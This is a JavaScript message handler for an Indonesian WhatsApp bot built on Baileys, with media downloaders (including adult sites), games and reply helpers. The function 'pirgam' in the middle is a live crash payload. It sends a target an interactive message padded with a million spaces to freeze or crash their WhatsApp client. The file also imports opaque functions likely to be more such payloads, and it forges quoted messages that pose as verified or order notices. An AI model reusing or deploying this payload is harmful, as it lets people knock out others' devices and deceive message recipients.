require("./config")
const { dycodersConnect, downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, mentionedJid, processTime, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WASocket, getStream, WAProto, isBaileys, AnyMessageContent, fetchLatestBaileysVersion, templateMessage, InteractiveMessage, Header, generateMessageIDV2 } = require('@whiskeysockets/baileys')
const fs = require('fs')
const { Client } = require('ssh2');
const os = require('os');
const util = require('util')
const cheerio = require('cheerio');
const chalk = require("chalk");
const axios = require('axios')
const sharp = require('sharp');
const yts = require ('yt-search');
const ytdl = require("ytdl-core");
const crypto = require('crypto')
const tough = require('tough-cookie');
const { wrapper } = require('axios-cookiejar-support');
const cookieJar = new tough.CookieJar();
const axiosInstance = wrapper(axios.create({ jar: cookieJar }));
const canvacord = require("canvacord");
const { exec } = require("child_process")
const { randomBytes } = require('crypto') 
const Tesseract = require('tesseract.js');
const { openai } = require('./lib/scrape/Ai');
const blackbox = require('./lib/scrape/blackbox');
const { addExif, addExifAvatar } = require('./lib/exif')
const levelling = require("./lib/levelling");
const { createCanvas, loadImage } = require('canvas');
const { formatSize, sleep, runtime, getBuffer, getRandom, fetchJson,generateProfilePicture, jsonformat, toRupiah, getGroupAdmins, randomNumber } = require("./lib/myfunc");
const { tiktokslide, Animedif, searchSpotifyTracks, mediafire, rtealistic, findSongs, remini, capcut, livecharttba, chat, jarak, ssweb, tiktok, PlayStore, BukaLapak, pinterest, stickersearch, lirik } = require("./lib/scraper")
const { getAudio, getModelIdVoice } = require('./lib/scrape/Voice');
const { YandexReverse } = require('./lib/scrape/Search'); 
const { downloadTrack, searchSpoti } = require('./lib/spotify')
const {
jadibot, 
stopjadibot,
listjadibot 
} = require('./clonebot/jadibot')

module.exports = async (dy, m) => {
const { type, content, sender, pushName, isGroup, mtype } = m
try {
if (global.db.data == null) await loadDatabase()
    require('./src/schema')(m);
    var chats = global.db.data.chats[m.chat],
        users = global.db.data.users[m.sender]
        settings = global.db.data.settings
const body = (
  m.mtype === 'conversation' ? m.message.conversation :
  m.mtype === 'imageMessage' ? m.message.imageMessage.caption :
  m.mtype === 'videoMessage' ? m.message.videoMessage.caption :
  m.mtype === 'extendedTextMessage' ? m.message.extendedTextMessage.text :
  m.mtype === 'buttonsResponseMessage' ? m.message.buttonsResponseMessage.selectedButtonId :
  m.mtype === 'listResponseMessage' ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
  m.mtype === 'InteractiveResponseMessage' ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson)?.id :
  m.mtype === 'templateButtonReplyMessage' ? m.message.templateButtonReplyMessage.selectedId :
  m.mtype === 'messageContextInfo' ?
    m.message.buttonsResponseMessage?.selectedButtonId ||
    m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
    m.message.InteractiveResponseMessage.NativeFlowResponseMessage ||
    m.text :
  ''
);
const isCreator = [dy.decodeJid(dy.user.id), ...global.rowner.map(([number]) => number), ].map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(m.sender);

let prefix;
let commandnya;

if (isCreator || global.db.data.users[m.sender].premium) {
  prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '';
  commandnya = body.startsWith(prefix) ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : '';
} else {
  prefix = /^[#!.,®©¥€¢£/\∆✓]/.test(body) ? body.match(/^[#!.,®©¥€¢£/\∆✓]/gi) : '#';
  commandnya = body.startsWith(prefix) ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : '';
}

//Database 
const pendaftar = JSON.parse(fs.readFileSync('./lib/database/pendaftar.json'))
let limitnya = db.data.users[m?.sender].limit
let balancenya = db.data.users[m?.sender].balance

const { xzeus, experiment1, zcb, rdo, rdo2, dbuz, locl, bounds, bounds2, listr, mbg, caltx, uzc, lza, paym } = require("./lib/scrape/myfunc");
const { locm, evm, zbt, zbt2 } = require("./lib/scrape/myfunc");
const ThumbGw = fs.readFileSync(`./media/images.jpeg`)

const isSticker = (type == 'stickerMessage')
const isImage = (type == 'imageMessage')
const isVideo = (type == 'videoMessage')
const isAudio = (type == 'audioMessage')

const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
const isQuotedTeks = type === 'extendedTextMessage' && content.includes('quotedMessage')
const isQuotedTag = type === 'extendedTextMessage' && content.includes('mentionedJid')
const isQuotedReply = type === 'extendedTextMessage' && content.includes('Message')
const isQuotedText = type === 'extendedTextMessage' && content.includes('conversation')
const isQuotedViewOnce = type === 'extendedTextMessage' && content.includes('viewOnceMessageV2')

const budy = (typeof m.text === 'string') ? m.text : '';
const from = m.key.remoteJid
const fatkuns = m && (m?.quoted || m);
const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
const isCmd = body.startsWith(prefix);
const mime = ((quoted?.msg || quoted) || {}).mimetype || '';
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
const args = body.trim().split(/ +/).slice(1)
const canvas = createCanvas(700, 250);
const ctx = canvas.getContext('2d');
const text = q = args.join(" ")
const sender = m.key.fromMe ? (dy.user.id.split(':')[0]+'@s.whatsapp.net' || dy.user.id) : (m.key.participant || m.key.remoteJid)
const botNumber = await dy.decodeJid(dy.user.id)
const senderNumber = sender.split('@')[0]
const mark = `0@s.whatsapp.net`
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const isUser = pendaftar.includes(m.sender)
const isMedia = /image|video|sticker|audio/.test(mime)
const qmsg = (quoted.msg || quoted)
let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : m.sender;
const isPremium = db.data.users[m?.sender].premium == true ? true : m?.sender == rowner ? true : false
const welcm = m.isGroup ? wlcm.includes(from) : false
const old = new Date()
// GROUP
const groupMetadata = m?.isGroup ? await dy.groupMetadata(m?.chat).catch(e => {}) : {};
//SCRAPE
const scdl = require('soundcloud-downloader').default;
const path = './soundcloud.mp3';
const { chatAI, fetchUser } = require("./lib/scrape/scrape-ai")
const { ytdlBaru } = require('./lib/scrape/scrape-ytdl')
const { ytdlnew } = require('./lib/ytdlnew')
const { tiktoks } = require('./lib/tiktoks')
const uploadImage = require('./lib/uploadImage.js')
let Button = require("./lib/button");
let btn = new Button();
const { TelegraPh, UploadFileUgu } = require('./lib/uploader');

//Group 
const groupName = m?.isGroup ? groupMetadata.subject || '' : '';
const participants = m?.isGroup ? await groupMetadata.participants || [] : [];
const groupAdmins = m?.isGroup ? await getGroupAdmins(participants) || [] : [];
const isBotAdmins = m?.isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = m?.isGroup ? groupAdmins.includes(m?.sender) : false;
const isPetualang = users.petualang
const isMonay = users.balance
const isCekDarah = users.darah
const isUmpan = users.umpan
//const isSewa = _sewa.checkSewaGroup(from, sewa)
const isPotion = users.potion
const isIkan = users.ikan
const isAyam = users.ayam
const isKelinci = users.kelinci
const isDomba = users.domba
const isSapi = users.sapi
const isGajah = users.gajah
const isBesi = users.besi
const isEmas = users.emas
const isEmerald = users.emerald
//Functions

async function uselimit() {
if (isCreator) return
global.db.data.users[m?.sender].limit -= 1
}






const fopenai = {
    key: {
        participant: '0@s.whatsapp.net'
    },
    message: {
        extendedTextMessage: {
            text: 'Bot By dycoders.xyz',
            title: ownername,
            thumbnailUrl: randomThumb
        }
    }
    }



if (chats.autodl) {
    try {
        if (budy.match(`instagram.com`)) {
            reply(`*「 LINK INSTAGRAM TERDETEKSI 」*\n\nTunggu sebentar, mendownload file...`);
            let ig = await dylux.igdl(budy)
            let url = ig.result[0].url
            if (url.includes('jpg')) {
                if (m.isGroup) {
                    ig.result.forEach(async (k) => {
                        await dy.sendMessage(m.sender, {
                            image: {
                                url: k.url
                            }
                        }, {
                            quoted: fverif
                        });
                    })

                    m.reply(`All photos have been sent to your private chat`)
                } else {
                    ig.result.forEach(async (k) => {
                        await dy.sendMessage(from, {
                            image: {
                                url: k.url
                            }
                        }, {
                            quoted: fverif
                        });
                    })
                }
            } else {
                dy.sendMessage(m.chat, {
                    video: {
                        url: ig.result[0].url
                    },
                    caption: mess.done
                }, {
                    quoted: fverif
                })
            }
        } else if (budy.match(`tiktok.com`)) {
            reply(`*「 LINK TIKTOK TERDETEKSI 」*\n\nTunggu sebentar, mendownload file...`);
            let json = await Scraper.Download.tiktok(budy)
            let caption = `*T I K T O K - D O W N L O A D E R*\n\n`
            caption += `	◦ *Id* : ${json.id}\n`
            caption += `	◦ *Username* : ${json.author.nickname}\n`
            caption += `	◦ *Title* : ${(json.title)}\n`
            caption += `	◦ *Like* : ${(json.stats.likes)}\n`
            caption += `	◦ *Comments* : ${(json.stats.comment)}\n`
            caption += `	◦ *Share* : ${(json.stats.share)}\n`
            caption += `	◦ *Views* : ${(json.stats.views)}\n`
            caption += `	◦ *Download* : ${json.stats.download}\n`
            caption += `	◦ *Size* : ${Func.formatSize(json.size_nowm_hd)}\n`
            caption += `	◦ *Duration* : ${json.duration}\n`
            caption += `	◦ *Fetching* : ${((new Date - old) * 1)} ms\n\n`
            if (json.data[0].url.includes('.jpeg')) {
                if (m.isGroup) {
                    json.data.forEach(async (k) => {
                        await dy.sendMessage(m.sender, {
                            image: {
                                url: k.url
                            }
                        }, {
                            quoted: fverif
                        });
                    })
                    m.reply(`all photos have been sent in private chat`)
                } else {
                    json.data.forEach(async (k) => {
                        await dy.sendMessage(m.sender, {
                            image: {
                                url: k.url
                            }
                        }, {
                            quoted: fverif
                        });
                    })
                }
            } else {
                await dy.sendMessage(from, {
                    video: {
                        url: json.data[2].url
                    },
                    caption: caption
                }, {
                    quoted: fverif
                });
            }
        } else if (budy.match(`facebook.com|fb.watch`)) {
            reply(`*「 LINK FACEBOOK TERDETEKSI 」*\n\nTunggu sebentar, mendownload file...`);
            let dat = await Scraper.Download.facebook(budy)
            let url = dat.video_hd
            dy.sendMessage(m.chat, {
                video: {
                    url: url
                },
                mimetype: 'video/mp4'
            }, {
                quoted: fverif
            })
            dy.sendMessage(m.chat, { audio: { url: dat.audio }, mimetype: 'audio/mp4' }, { quoted: fverif })
        } else if (budy.match(`youtube.com|youtu.be`)) {
            reply(`*「 LINK YOUTUBE TERDETEKSI 」*\n\nTunggu sebentar, mendownload file...`);
            let pl = await Scraper.Download.getVideoInfo(budy)
            teks = `*Title* : ${pl.title}

`
            dy.sendMessage(m.chat, {
                video: {
                    url: `${pl.url}`
                },
                caption: teks,
                mimetype: 'video/mp4',
                fileName: `${pl.title}.mp4`
            }, {
                quoted: fverif
            })
            let ple = await Scraper.YTnew.ytdlnew(budy)
            dy.sendMessage(m.chat, {
                audio: {
                    url: ple.audioUrl
                },
                mimetype: 'audio/mpeg',
                contextInfo: {
                    externalAdReply: {
                        title: `${ple.title}`,
                        body: `Views : ${ple.duration}`,
                        thumbnailUrl: ple.thumbnail,
                        mediaType: 2,
                        mediaUrl: `${text}`,
                        sourceUrl: `${text}`,
                        renderLargerThumbnail: true
                    }
                }
            }, {
                quoted: fverif
            })
        } else if (budy.match(`threads.net`)) {
            reply(`*「 LINK THREADS TERDETEKSI 」*\n\nTunggu sebentar, mendownload file...`);
            let timestamp = speed()
            let latensi = speed() - timestamp
            let json = await Scraper.Download.threads(budy)
            dy.sendMessage(m.chat, {
                video: {
                    url: json.video_urls[0].download_url
                },
                caption: `🍟 *Fetching* : ${latensi.toFixed(4)} ms`
            }, {
                quoted: fverif
            })
        } else if (budy.match(`twitter.com`)) {
            reply(`*「 LINK TWITTER TERDETEKSI 」*\n\nTunggu sebentar, mendownload file...`);
            let json = await Scraper.Download.twitter(budy);
            dy.sendMessage(m.chat, {
                video: {
                    url: json.HD
                },
                caption: "𝙎𝙪𝙠𝙨𝙚𝙨 ✅"
            }, {
                quoted: fverif
            });
        } else if (budy.match(`xnxx.com`)) {
            reply(`*「 LINK XNXX TERDETEKSI 」*\n\nTunggu sebentar, mendownload file...`);
            let anu = await Scraper.Download.xnxxdl(budy);
            const cpt = anu.result.title;
            const nick = anu.result.info;
            const dr = anu.result.duration;
            dy.sendMessage(m.chat, {
                video: {
                    url: anu.result.files.high
                },
                caption: `乂 X N X X - D L\n\n ◦ Judul : ${cpt}\n ◦ Durasi : ${dr}\n ◦ Info : ${nick}\n\n${footer}`
            }, {
                quoted: fverif
            });
        } else if (budy.match(`xvideos.com`)) {
            reply(`*「 LINK XVIDEOS TERDETEKSI 」*\n\nTunggu sebentar, mendownload file...`);
            let anu = await dylux.xvideosdl(budy);
            let tks = `乂 X V I D E O S - D L\n\n ◦ Judul : ${anu.title}\n ◦ Views : ${anu.views}\n ◦ Likes : ${anu.likes}\n ◦ Size : ${anu.size}\n\n${footer}`;
            dy.sendMessage(m.chat, {
                video: {
                    url: anu.url_dl
                },
                caption: tks
            }, {
                quoted: fverif
            });
        } else if (budy.match(`mediafire.com`)) {
            reply(`*「 LINK MEDIAFIRE TERDETEKSI 」*\n\nTunggu sebentar, mendownload file...`);
            const baby1 = await Scraper.Download.mediafireDl(budy);
            if (parseFloat(baby1[0].size.split('MB')[0]) >= 50) {
                return reply('😅 Waduh Filenya Terlalu Besar...');
            }
            dy.sendMessage(m.chat, {
                document: {
                    url: baby1[0].link
                },
                fileName: baby1[0].nama,
                mimetype: baby1[0].mime
            }, {
                quoted: fverif
            });
        }
    } catch (err) {
        console.log(err);
        reply("Emmm anu om, error hehe:v");
    }
    }
    
async function downloadMp3(q) {
  try {
    const response = await axios.post('https://api.kyuurzy.tech/api/download/ytdl', {
      text: q
    }, {
      headers: {
        'accept': '*/*',
        'api_key': 'free',
        'Content-Type': 'application/json'
      }
    });
    
    return response.data
  } catch (error) {
    console.error('Error:', error);
  }
}

async function downloadMp4(url) {
    const response = await fetch('https://shinoa.us.kg/api/download/ytdl', {
        method: 'POST',
        headers: {
            'accept': '*/*',
            'api_key': 'free',
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            text: url
        })
    });

    if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
    }

    const data = await response.json();
    return data;
}


msToDate = (ms) => {
  let years = Math.floor(ms / (1000 * 60 * 60 * 24 * 365));
  let months = Math.floor(
    (ms % (1000 * 60 * 60 * 24 * 365)) / (1000 * 60 * 60 * 24 * 30)
  );
  let weeks = Math.floor(
    (ms % (1000 * 60 * 60 * 24 * 30)) / (1000 * 60 * 60 * 24 * 7)
  );
  let days = Math.floor(
    (ms % (1000 * 60 * 60 * 24 * 7)) / (1000 * 60 * 60 * 24)
  );
  return `${years} tahun ${months} bulan ${weeks} minggu ${days} hari`;
};


msToDay = (ms) => {
  let temp = ms;
  let years = Math.floor(temp / (365 * 24 * 60 * 60 * 1000));
  temp = temp % (365 * 24 * 60 * 60 * 1000);
  let months = Math.floor(temp / (30 * 24 * 60 * 60 * 1000));
  temp = temp % (30 * 24 * 60 * 60 * 1000);
  let weeks = Math.floor(temp / (7 * 24 * 60 * 60 * 1000));
  temp = temp % (7 * 24 * 60 * 60 * 1000);
  let days = Math.floor(temp / (24 * 60 * 60 * 1000));
  temp = temp % (24 * 60 * 60 * 1000);
  let hours = Math.floor(temp / (60 * 60 * 1000));
  temp = temp % (60 * 60 * 1000);
  let minutes = Math.floor(temp / (60 * 1000));
  temp = temp % (60 * 1000);

  let result = "";
  if (years > 0) {
    result += years + (years > 1 ? " tahun " : " tahun ");
  }
  if (months > 0) {
    result += months + (months > 1 ? " bulan " : " bulan ");
  }
  if (weeks > 0) {
    result += weeks + (weeks > 1 ? " minggu " : " minggu ");
  }
  if (days > 0) {
    result += days + (days > 1 ? " hari " : " hari ");
  }
  if (hours > 0) {
    result += hours + (hours > 1 ? " jam " : " jam ");
  }
  if (minutes > 0) {
    result += minutes + (minutes > 1 ? " menit " : " menit ");
  }
  return result.trim();
};

try {
    ppuser = await dy.profilePicture(who, 'image')
    } catch (err) {
    ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
    }
    ppnyauser = await getBuffer(ppuser)

async function getRandom(min, max) {
min = Math.ceil(min);
max = Math.floor(max);
return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomNomor(min, max = null){
if (max !== null) {
min = Math.ceil(min);
max = Math.floor(max);
return Math.floor(Math.random() * (max - min + 1)) + min;
} else {
return Math.floor(Math.random() * min) + 1
}
}

const fverif = {
    key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(from ? {
            remoteJid: "status@broadcast"
        } : {})
    },
    'message': {
        extendedTextMessage: {
            text: Styles(`_wabot by ${ownername}_`)
        }
    }
    }




async function makeSticker(media,Sticker, StickerTypes){
let jancok = new Sticker(media, {
pack: global.packname, 
author: m.pushname,
type: StickerTypes.FULL, 
categories: ['🤩', '🎉'],
id: '12345',
quality: 70, 
background: '#FFFFFF00'
})
let stok = getRandom(".webp")
let nono = await jancok.toFile(stok)
let nah = fs.readFileSync(nono)
await dy.sendMessage(from, { contextInfo: {externalAdReply: {showAdAttribution: true, title: `${botname}`, mediaType: 3,renderLargerThumbnail : true,thumbnailUrl:`https://telegra.ph/file/662564e95a8fe4c21cb33.jpg`,sourceUrl: `dycoders.xyz`
}}, sticker: nah }, { quoted: fverif })
await fs.unlinkSync(stok)
}

const pickRandom = (arr) => {
        return arr[Math.floor(Math.random() * arr.length)]
        }
        
var randomColor = ['#232023'];
const apiColor = randomColor[Math.floor(Math.random() * randomColor.length)];

if (budy.includes("@everyone")) {
    if(!isCreator) return
    if (m.isGroup) {
        if (isAdmins || isBotAdmins) {
            return dy.sendMessage(m.chat, {
                text: body.replace(/@everyone/i, '@' + m.chat),
                contextInfo: {
                    mentionedJid: (await dy.groupMetadata(m.chat)).participants.map(v => v.id),
                    groupMentions: [{
                        groupSubject: "everyone",
                        groupJid: m.chat
                    }]
                }
            })
        }
    }
    }

dy.sendUrlKu = async (jid, title, footwr, options = {}) => {
    const msg = {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: {
                    body: {
                        text: title
                    },
                    footer: {
                        text: footwr
                    },
                    nativeFlowMessage: {
                        buttons: [{
                            "name": "cta_url",
                            "buttonParamsJson": `{\"display_text\":\"Saluran WhatsApp \",\"url\":\"${saluran}\",\"merchant_url\":\"${saluran}\"}`
                        }]
                    },
                    contextInfo: {
                        mentionedJid: await ments(title),
                        quotedMessage: m.message,
                        participant: m.sender,
                        ...m.key,
                        isForwarded: true, 
                        forwardedNewsletterMessageInfo: {
                        newsletterJid: global.idsal,
                        newsletterName: Tasistent, 
                        serverMessageId: -1
                    }
                  },
                }
            }
        }
    };
    return dy.relayMessage(jid, msg, {});
    }

async function falseR () {
dy.sendReact(m.chat, '❌', m.key)
}

function monospace(string) {
return '```' + string + '```'
}






async function reply(txt) {
const Dyganteng = {      
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterName: botname,
newsletterJid: "120363303267333730@newsletter",
},
externalAdReply: {  
showAdAttribution: true,
title: `¥ dy_net ¥ `,
body: '로dycoders.xyz',
thumbnailUrl: 'https://telegra.ph/file/662564e95a8fe4c21cb33.jpg',
sourceUrl: 'https://dycoders.xyz',
},
},
text: txt,
}
return dy.sendMessage(m.chat, Dyganteng, {
quoted: fverif,
})
}

async function pirgam(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "🩸⃟༑⌁⃰𝐙͈𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/e8c1aee03b13f008ff65d.jpg" } }, { upload: dy.waUploadToServer }))
      },
      body: {
        text: ""
      },
      footer: {
        text: "›          #rafatharcodedominate"
      },
      nativeFlowMessage: {
        messageParamsJson: " ".repeat(1000000)
      }
    }
}), { userJid: target, quoted: kuwoted });
await dy.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

const pdf = [
 "application/pdf",
 "application/msword",
 "application/vnd.ms-excel",
"application/vnd.ms-powerpoint",
"application/zip",
"application/x-rar-compressed",
"application/x-tar",
"application/x-7z-compressed",
"application/epub+zip",
"application/json"
]

const df = pdf
const rm = df[Math.floor(Math.random() * df.length)]
  let links = [
"https://telegra.ph/file/28282735848de7989301c.png"
]


const zets = {
  key: {
    fromMe: false,
    participant: '0@s.whatsapp.net',
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2024",
      thumbnail: ThumbGw,
      itemCount: `99999999999`,
      status: "INQUIRY",
      surface: "CATALOG",
      message: `안 dycoders.xyz Not Found`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: m.sender.split,
    forwardingScore: 99999,
    isForwarded: true
  }
}

async function replymenu(text) {
    const botname = "DY_NET";


    await dy.sendMessage(m.chat, {
        video: { url: "https://files.catbox.moe/hcn73t.mp4" }, 
        caption: text, 
        gifPlayback: true,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: botname,
                newsletterJid: "120363303267333730@newsletter",
            },
            mentionedJid: [m.sender],
            externalAdReply: {
                title: `안 dycoders.xyz`,
                body: `去他的支持系统，我自己可以搞定`,
                thumbnailUrl: "https://telegra.ph/file/662564e95a8fe4c21cb33.jpg",
                sourceUrl: `https://dycoders.xyz`,
                mediaType: 1,
                renderLargerThumbnail: true,
            },
        },
    }, { quoted: fverif });

  
    await dy.sendMessage(m.chat, {
        audio: fs.readFileSync("./media/audio.mp3"),
        mimetype: "audio/mpeg",
        ptt: true,
    }, { quoted: fverif });
}


if (/\b(dy|dycoders|broo|halo|assalamualaikum|gabut|dyy|dyyy|dedycoders|bro|p|halomas|panel gimana|Dyy|ka|menu|bot)\b/i.test(m.text.toLowerCase())) {
  const emojis = ['😁', '🥶', '🤔', '😎', '🖖🏻', '🔥', '⭐', '❓'];
  const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
  await dy.sendMessage(m.chat, { react: { text: randomEmoji, key: m.key } });
}


//Batas 
const moment = require('moment-timezone');
const time = moment().tz("Asia/Jakarta").format("HH:mm:ss");
const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
let ucapanWaktu
if (time >= "19:00:00" && time < "23:59:00") {
ucapanWaktu = "🌃𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐌𝐚𝐥𝐚𝐦"
} else if (time >= "15:00:00" && time < "19:00:00") {
ucapanWaktu = "🌄𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐨𝐫𝐞"
} else if (time >= "11:00:00" && time < "15:00:00") {
ucapanWaktu = "🏞️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐢𝐚𝐧𝐠"
} else if (time >= "06:00:00" && time < "11:00:00") {
ucapanWaktu = "🏙️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐏𝐚𝐠𝐢"
} else {
ucapanWaktu = "🌆𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐮𝐛𝐮𝐡"
};

if (isCmd && !isUser) {
pendaftar.push(m.sender)
fs.writeFileSync('./lib/database/pendaftar.json', JSON.stringify(pendaftar, null, 2))
}



if (m.message) {
if (isCmd && !m.isGroup) {
console.log(chalk.black(chalk.bgHex('#ff5e78').bold(`\n🌟 ${ucapanWaktu} 🌟`)));
console.log(chalk.white(chalk.bgHex('#4a69bd').bold(`🚀 Ada Pesan, Om! 🚀`)));
console.log(chalk.black(chalk.bgHex('#fdcb6e')(`📅 DATE: ${new Date().toLocaleString()}
💬 MESSAGE: ${m.body || m.mtype}
🗣️ SENDERNAME: ${pushname}
👤 JIDS: ${m.sender}`)));
} else if (m.isGroup) {
console.log(chalk.black(chalk.bgHex('#ff5e78').bold(`\n🌟 ${ucapanWaktu} 🌟`)));
console.log(chalk.white(chalk.bgHex('#4a69bd').bold(`🚀 Ada Pesan, Om! 🚀`)));
console.log(chalk.black(chalk.bgHex('#fdcb6e')(`📅 DATE: ${new Date().toLocaleString()}
💬 MESSAGE: ${m.body || m.mtype}
🗣️ SENDERNAME: ${pushname}
👤 JIDS: ${m.sender}
🔍 MESS LOCATION: ${groupName}`)));
}
}
//ResponsGame



try {
let id = m.chat;
let timeout = 180000;
let hadiah = randomNumber(10000, 20000);
let users = global.db.data.users[m.sender];
let budy = typeof m.body == 'string' ? m.body : false;
dy.bomb = dy.bomb ? dy.bomb : {};

if (dy.bomb[id] && !isNaN(body) && !isCmd) {
let json = dy.bomb[id][1].find(v => v.position == body);
if (!json) return
if (json.emot == '💥') {
json.state = true;
let bomb = dy.bomb[id][1];
let teks = `*DUARRRRRR 💥*\n\n`;
teks += bomb.slice(0, 3).map(v => v.state ? v.emot : v.number).join('') + '\n';
teks += bomb.slice(3, 6).map(v => v.state ? v.emot : v.number).join('') + '\n';
teks += bomb.slice(6).map(v => v.state ? v.emot : v.number).join('') + '\n\n';
teks += `@${m.sender.split("@")[0]} membuka kotak yang berisi *Bom* Game di hentikan!`
dy.sendMessage(m.chat, {text: teks, contextInfo: {mentionedJid: [m.sender], externalAdReply: {thumbnailUrl: "https://telegra.ph/file/da5e5612ccead39af2e93.jpg", title: " 🎮  𝗚 𝗔 𝗠 𝗘 - 𝗧 𝗘 𝗕 𝗔 𝗞 - 𝗕 𝗢 𝗢 𝗠  🎮", body: null, renderLargerThumbnail: true, sourceUrl: null, mediaType: 1}}}, {quoted: kalgans}).then(() => {
clearTimeout(dy.bomb[id][2]);
delete dy.bomb[id];
});
} else if (json.state) {
return dy.sendText(m.chat, `Kotak ${json.number} sudah di buka silahkan pilih kotak yang lain!`, m);
} else {
json.state = true;
let changes = dy.bomb[id][1];
let open = changes.filter(v => v.state && v.emot != '💥').length;

if (open >= 8) {
let teks = `*🎮 GAME TEBAK BOM 🎮*\n\nKirim angka *1* - *9* untuk membuka *9* kotak nomor di bawah ini :\n\n`;
teks += changes.slice(0, 3).map(v => v.state ? v.emot : v.number).join('') + '\n';
teks += changes.slice(3, 6).map(v => v.state ? v.emot : v.number).join('') + '\n';
teks += changes.slice(6).map(v => v.state ? v.emot : v.number).join('') + '\n\n';
teks += `*Permainan selesai!* kotak berisi bom tidak terbuka\n*+ $${toRupiah(hadiah)} balance* ke @${m.sender.split("@")[0]}`;

dy.sendMessage(m.chat, {text: teks, contextInfo: {mentionedJid: [m.sender]}}, {quoted: kalgans}).then(() => {
db.data.users[m.sender].balance += hadiah;
clearTimeout(dy.bomb[id][2]);
delete dy.bomb[id];
});
} else {
let teks = `*🎮 GAME TEBAK BOM 🎮*\n\nKirim angka *1* - *9* untuk membuka *9* kotak nomor di bawah ini :\n\n`;
teks += changes.slice(0, 3).map(v => v.state ? v.emot : v.number).join('') + '\n';
teks += changes.slice(3, 6).map(v => v.state ? v.emot : v.number).join('') + '\n';
teks += changes.slice(6).map(v => v.state ? v.emot : v.number).join('') + '\n\n';
teks += `Waktu : *${((timeout / 1000) / 60)} menit*\n`;
teks += `Kotak berisi bom tidak terbuka\n*+ $${toRupiah(hadiah)} balance* ke @${m.sender.split("@")[0]}`;

dy.sendMessage(m.chat, {text: teks, contextInfo: {mentionedJid: [m.sender]}}, {quoted: kalgans}).then(() => {
db.data.users[m.sender].balance += hadiah;
});
}
}
}
} catch (e) {
return dy.sendText(m.chat, e.toString(), m);
}

if ((from in tebakgambar2)) {
let { soal, jawaban, hadiah, waktu } = tebakgambar2[from]
if (budy.toLowerCase() == "nyerah") {
m.reply(`*KAMU PAYAH ಠ⁠﹏⁠ಠ*\n\nJawabannya adalah *${tebakgambar2[from].jawaban}*`);
delete tebakgambar2[from]
clearTimeout(waktu);
} else if (body.toLowerCase().includes(jawaban)) {
await m.reply(`*JAWABAN BENAR*\n\n*Penebak :* ${tag}\n*Jawaban :* ${jawaban}\n*Hadiah Saldo :* Rp. 150`);
